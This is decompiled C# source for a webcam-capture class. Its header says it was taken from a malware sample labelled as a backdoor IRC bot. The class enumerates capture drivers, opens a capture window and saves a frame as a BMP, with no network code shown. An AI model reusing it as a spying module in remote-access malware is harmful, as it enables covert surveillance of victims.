// Decompiled with JetBrains decompiler
// Type: Irc9.WebCam
// Assembly: Irc9, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E7A76116-F62B-4512-BE9B-418015CDF203
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.MSIL.IrcBot.ts-ca7c95003f1d98515fb57c5abb26f6ed9b53d83503d9e6f6d3082ef1428ffdee.exe

using System;
using System.Collections;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Irc9
{
  public class WebCam : IDisposable
  {
    private const short WM_CAP = 1024;
    private const int WM_CAP_DRIVER_CONNECT = 1034;
    private const int WM_CAP_DRIVER_DISCONNECT = 1035;
    private const int WM_CAP_EDIT_COPY = 1054;
    private const int WM_CAP_SET_PREVIEW = 1074;
    private const int WM_CAP_SET_PREVIEWRATE = 1076;
    private const int WM_CAP_SET_SCALE = 1077;
    private const int WS_CHILD = 1073741824;
    private const int WS_VISIBLE = 268435456;
    private const short SWP_NOMOVE = 2;
    private const short SWP_NOSIZE = 1;
    private const short SWP_NOZORDER = 4;
    private const short HWND_BOTTOM = 1;
    private int DeviceID = 0;
    private int hHwnd = 0;
    public ArrayList ListOfDevices = new ArrayList();

    [DllImport("avicap32.dll")]
    protected static extern bool capGetDriverDescriptionA(
      short wDriverIndex,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
      int cbName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
      int cbVer);

    [DllImport("avicap32.dll")]
    protected static extern int capCreateCaptureWindowA(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName,
      int dwStyle,
      int x,
      int y,
      int nWidth,
      int nHeight,
      int hWndParent,
      int nID);

    [DllImport("user32")]
    protected static extern int SetWindowPos(
      int hwnd,
      int hWndInsertAfter,
      int x,
      int y,
      int cx,
      int cy,
      int wFlags);

    [DllImport("user32", EntryPoint = "SendMessageA")]
    protected static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam);

    [DllImport("avicap32.dll")]
    private static extern int capCreateCaptureWindow(
      string lpszWindowName,
      int dwStyle,
      int X,
      int Y,
      int nWidth,
      int nHeight,
      int hwndParent,
      int nID);

    [DllImport("user32")]
    protected static extern bool DestroyWindow(int hwnd);

    public PictureBox Container { get; set; }

    public void Load()
    {
      string lpszName = string.Empty.PadRight(100);
      string lpszVer = string.Empty.PadRight(100);
      short wDriverIndex = 0;
      bool driverDescriptionA;
      do
      {
        driverDescriptionA = WebCam.capGetDriverDescriptionA(wDriverIndex, ref lpszName, 100, ref lpszVer, 100);
        if (driverDescriptionA)
          this.ListOfDevices.Add((object) lpszName.Trim());
        ++wDriverIndex;
      }
      while (driverDescriptionA);
    }

    public void OpenConnection()
    {
      this.Container = new PictureBox();
      string lpszWindowName = Convert.ToString(this.DeviceID);
      IntPtr handle = this.Container.Handle;
      this.hHwnd = WebCam.capCreateCaptureWindowA(ref lpszWindowName, 1342177280, 0, 0, 640, 480, handle.ToInt32(), 0);
      if (WebCam.SendMessage(this.hHwnd, 1034, 0, (object) 0) != 1)
        return;
      WebCam.SendMessage(this.hHwnd, 1077, -1, (object) 0);
      WebCam.SendMessage(this.hHwnd, 1076, 66, (object) 0);
      WebCam.SendMessage(this.hHwnd, 1074, -1, (object) 0);
      WebCam.SetWindowPos(this.hHwnd, 1, 0, 0, this.Container.Height, this.Container.Width, 6);
    }

    private void CloseConnection()
    {
      WebCam.SendMessage(this.hHwnd, 1035, this.DeviceID, (object) 0);
      WebCam.DestroyWindow(this.hHwnd);
    }

    public void SaveImage(string path)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
      saveFileDialog.Filter = "(*.bmp)|*.bmp";
      WebCam.SendMessage(this.hHwnd, 1054, 0, (object) 0);
      IDataObject dataObject = Clipboard.GetDataObject();
      if (!dataObject.GetDataPresent(typeof (Bitmap)))
        return;
      Image data = (Image) dataObject.GetData(typeof (Bitmap));
      this.Container.Image = data;
      this.CloseConnection();
      if (saveFileDialog.ShowDialog() == DialogResult.OK)
        data.Save(saveFileDialog.FileName, ImageFormat.Bmp);
    }

    public void Dispose() => this.CloseConnection();
  }
}
